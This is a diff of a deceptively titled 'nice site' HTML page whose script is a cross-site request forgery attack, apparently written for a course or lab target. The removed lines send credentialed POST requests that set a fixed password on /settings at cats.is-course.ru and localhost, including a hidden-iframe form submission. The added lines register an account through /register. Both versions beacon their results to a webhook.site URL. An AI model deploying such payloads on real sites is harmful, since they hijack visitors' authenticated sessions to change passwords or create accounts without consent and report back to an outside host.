@@ -1,23 +1,8 @@
-<!doctype html><html><head><meta charset="utf-8"></head><body>
-<h1>nice site</h1>
+<!doctype html><html><head><meta charset="utf-8"></head><body><h1>nice site</h1>
 <script>
-var U="5169748c-49df-4307-9820-7383309d9f02";
-var body="password=Zz9!kq12345678&confirm-password=Zz9!kq12345678";
-function beacon(t){new Image().src="https://webhook.site/"+U+"/"+t}
-beacon("start");
-var targets=["http://localhost:8080/settings","https://cats.is-course.ru/settings"];
-targets.forEach(function(t,i){
-  try{
-    fetch(t,{method:"POST",mode:"no-cors",credentials:"include",
-      headers:{"Content-Type":"application/x-www-form-urlencoded"},body:body})
-      .then(function(){beacon("ok"+i)}).catch(function(e){beacon("err"+i)});
-  }catch(e){beacon("throw"+i)}
-});
-setTimeout(function(){
- var f=document.createElement("form");f.method="POST";f.action="https://cats.is-course.ru/settings";f.target="hidden_iframe";
- f.innerHTML='<input name="password" value="Zz9!kq12345678"><input name="confirm-password" value="Zz9!kq12345678">';
- var ifr=document.createElement("iframe");ifr.name="hidden_iframe";ifr.style.display="none";
- document.body.appendChild(ifr);document.body.appendChild(f);f.submit();beacon("formsubmitted");
-},1500);
-</script>
-</body></html>
+var U="5169748c-49df-4307-9820-7383309d9f02", LG="csrfuser3925696";
+var body="login="+LG+"&password=Zz9!kq12345678&confirm-password=Zz9!kq12345678";
+fetch("https://cats.is-course.ru/register",{method:"POST",mode:"no-cors",credentials:"include",
+ headers:{"Content-Type":"application/x-www-form-urlencoded"},body:body})
+ .then(function(){new Image().src="https://webhook.site/"+U+"/regok"}).catch(function(){new Image().src="https://webhook.site/"+U+"/regerr"});
+</script></body></html>
